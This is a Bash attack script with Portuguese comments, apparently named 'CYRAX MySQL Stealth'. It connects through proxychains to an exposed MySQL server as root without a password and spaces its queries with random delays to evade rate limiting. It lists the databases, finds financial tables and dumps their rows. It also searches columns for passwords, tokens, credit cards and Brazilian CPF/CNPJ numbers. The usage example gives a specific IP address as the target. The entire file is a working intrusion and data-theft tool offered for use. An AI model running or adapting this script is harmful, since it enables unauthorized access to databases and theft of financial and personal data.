#!/bin/bash
# CYRAX MySQL Stealth - Acesso discreto a MySQL com evasão de rate limiting

TARGET="$1"
PORT="${2:-3306}"
MODE="${3:-dump}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <HOST> [PORT] [MODE]"
    echo "Modos: test, enum, dump, search"
    echo "Exemplo: $0 177.93.107.23 3306 dump"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/mysql_stealth_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "=== CYRAX MYSQL STEALTH ==="
echo "🎯 Target: $TARGET:$PORT"
echo "🔧 Mode: $MODE"
echo "📁 Output: $TEMP_DIR"

# Delays inteligentes para evitar bloqueio
DELAY_MIN=30
DELAY_MAX=60

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$TEMP_DIR/mysql.log"
}

smart_delay() {
    local delay=$((RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN))
    log "⏳ Aguardando $delay segundos (anti-rate-limit)"
    sleep $delay
}

# Teste de conectividade com retry
test_connection() {
    log "🔍 Testando conectividade MySQL"
    
    local max_retries=3
    local retry=0
    
    while [ $retry -lt $max_retries ]; do
        local result=$(timeout 30 proxychains4 -q mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=30 -e "SELECT 1;" 2>&1)
        
        if echo "$result" | grep -q "ERROR 2002"; then
            log "⚠️  Conexão recusada (rate limit ativo)"
            retry=$((retry + 1))
            if [ $retry -lt $max_retries ]; then
                smart_delay
            fi
        elif echo "$result" | grep -q "ERROR 1045"; then
            log "✅ MySQL acessível mas requer senha"
            return 1
        elif echo "$result" | grep -q "1"; then
            log "🔥 MySQL SEM SENHA!"
            return 0
        else
            log "❌ Erro desconhecido: $result"
            return 2
        fi
    done
    
    log "❌ Falha após $max_retries tentativas"
    return 3
}

# Enumeração de databases
enum_databases() {
    log "📊 Enumerando databases"
    
    local dbs=$(timeout 30 proxychains4 -q mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=30 -e "SHOW DATABASES;" 2>/dev/null | tail -n +2)
    
    if [ -n "$dbs" ]; then
        echo "$dbs" > "$TEMP_DIR/databases.txt"
        log "✅ Databases encontradas:"
        echo "$dbs" | while read db; do
            log "  - $db"
        done
        return 0
    else
        log "❌ Falha ao enumerar databases"
        return 1
    fi
}

# Buscar tabelas financeiras
search_financial_tables() {
    log "💰 Buscando tabelas financeiras"
    
    local financial_keywords=("transaction" "payment" "invoice" "balance" "credit" "financial" "account" "billing" "perfin" "report")
    
    if [ ! -f "$TEMP_DIR/databases.txt" ]; then
        enum_databases
        smart_delay
    fi
    
    while IFS= read -r db; do
        if [ -n "$db" ] && [ "$db" != "information_schema" ] && [ "$db" != "performance_schema" ] && [ "$db" != "mysql" ] && [ "$db" != "sys" ]; then
            log "🔍 Analisando database: $db"
            
            local tables=$(timeout 30 proxychains4 -q mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=30 -e "USE $db; SHOW TABLES;" 2>/dev/null | tail -n +2)
            
            if [ -n "$tables" ]; then
                echo "$tables" | while read table; do
                    for keyword in "${financial_keywords[@]}"; do
                        if echo "$table" | grep -qi "$keyword"; then
                            log "💎 Tabela financeira encontrada: $db.$table"
                            echo "$db.$table" >> "$TEMP_DIR/financial_tables.txt"
                        fi
                    done
                done
            fi
            
            smart_delay
        fi
    done < "$TEMP_DIR/databases.txt"
}

# Dump de tabelas financeiras
dump_financial_data() {
    log "📥 Fazendo dump de dados financeiros"
    
    if [ ! -f "$TEMP_DIR/financial_tables.txt" ]; then
        search_financial_tables
    fi
    
    if [ ! -f "$TEMP_DIR/financial_tables.txt" ]; then
        log "❌ Nenhuma tabela financeira encontrada"
        return 1
    fi
    
    while IFS= read -r full_table; do
        local db=$(echo "$full_table" | cut -d'.' -f1)
        local table=$(echo "$full_table" | cut -d'.' -f2)
        
        log "💾 Dump: $db.$table"
        
        local dump=$(timeout 60 proxychains4 -q mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=30 -e "USE $db; SELECT * FROM $table LIMIT 100;" 2>/dev/null)
        
        if [ -n "$dump" ]; then
            echo "$dump" > "$TEMP_DIR/dump_${db}_${table}.txt"
            log "✅ Dump salvo: dump_${db}_${table}.txt"
            
            # Contar registros
            local count=$(echo "$dump" | wc -l)
            log "📊 Registros: $((count - 1))"
        else
            log "⚠️  Falha no dump de $db.$table"
        fi
        
        smart_delay
    done < "$TEMP_DIR/financial_tables.txt"
}

# Busca específica por dados sensíveis
search_sensitive_data() {
    log "🔐 Buscando dados sensíveis"
    
    local sensitive_columns=("password" "token" "secret" "key" "credit_card" "cpf" "cnpj" "email" "phone")
    
    if [ ! -f "$TEMP_DIR/databases.txt" ]; then
        enum_databases
        smart_delay
    fi
    
    while IFS= read -r db; do
        if [ -n "$db" ] && [ "$db" != "information_schema" ] && [ "$db" != "performance_schema" ] && [ "$db" != "mysql" ] && [ "$db" != "sys" ]; then
            log "🔍 Buscando em: $db"
            
            for column in "${sensitive_columns[@]}"; do
                local query="SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='$db' AND COLUMN_NAME LIKE '%$column%';"
                local result=$(timeout 30 proxychains4 -q mysql -h "$TARGET" -P "$PORT" -u root --connect-timeout=30 -e "$query" 2>/dev/null | tail -n +2)
                
                if [ -n "$result" ]; then
                    log "💎 Coluna sensível encontrada: $column em $db"
                    echo "$db|$column|$result" >> "$TEMP_DIR/sensitive_columns.txt"
                fi
            done
            
            smart_delay
        fi
    done < "$TEMP_DIR/databases.txt"
}

# Relatório final
generate_report() {
    log "📊 Gerando relatório"
    
    local report="$TEMP_DIR/MYSQL_STEALTH_REPORT.md"
    
    cat > "$report" <<EOF
# MYSQL STEALTH - RELATÓRIO

**Target:** $TARGET:$PORT
**Mode:** $MODE
**Timestamp:** $(date)
**Duration:** $SECONDS seconds

## 🎯 RESUMO

EOF
    
    local db_count=0
    local financial_count=0
    local dump_count=0
    local sensitive_count=0
    
    [ -f "$TEMP_DIR/databases.txt" ] && db_count=$(wc -l < "$TEMP_DIR/databases.txt")
    [ -f "$TEMP_DIR/financial_tables.txt" ] && financial_count=$(wc -l < "$TEMP_DIR/financial_tables.txt")
    dump_count=$(ls "$TEMP_DIR"/dump_*.txt 2>/dev/null | wc -l)
    [ -f "$TEMP_DIR/sensitive_columns.txt" ] && sensitive_count=$(wc -l < "$TEMP_DIR/sensitive_columns.txt")
    
    echo "- **Databases:** $db_count" >> "$report"
    echo "- **Tabelas financeiras:** $financial_count" >> "$report"
    echo "- **Dumps realizados:** $dump_count" >> "$report"
    echo "- **Colunas sensíveis:** $sensitive_count" >> "$report"
    
    if [ $financial_count -gt 0 ]; then
        echo -e "\n## 💰 TABELAS FINANCEIRAS\n\`\`\`" >> "$report"
        cat "$TEMP_DIR/financial_tables.txt" >> "$report"
        echo "\`\`\`" >> "$report"
    fi
    
    if [ $dump_count -gt 0 ]; then
        echo -e "\n## 📥 DUMPS REALIZADOS\n" >> "$report"
        ls "$TEMP_DIR"/dump_*.txt | while read f; do
            echo "- $(basename $f)" >> "$report"
        done
    fi
    
    echo -e "\n## 📁 ARQUIVOS\nTodos em: \`$TEMP_DIR\`" >> "$report"
    
    cat "$report"
    
    echo -e "\n🎯 RESUMO:"
    echo "🗄️  Databases: $db_count"
    echo "💰 Tabelas financeiras: $financial_count"
    echo "📥 Dumps: $dump_count"
    echo "🔐 Colunas sensíveis: $sensitive_count"
}

# Execução principal
case "$MODE" in
    "test")
        test_connection
        ;;
    "enum")
        if test_connection; then
            smart_delay
            enum_databases
        fi
        ;;
    "dump")
        if test_connection; then
            smart_delay
            enum_databases
            smart_delay
            search_financial_tables
            smart_delay
            dump_financial_data
        fi
        ;;
    "search")
        if test_connection; then
            smart_delay
            enum_databases
            smart_delay
            search_sensitive_data
        fi
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ MYSQL STEALTH CONCLUÍDO!"
echo "📁 Resultados: $TEMP_DIR"
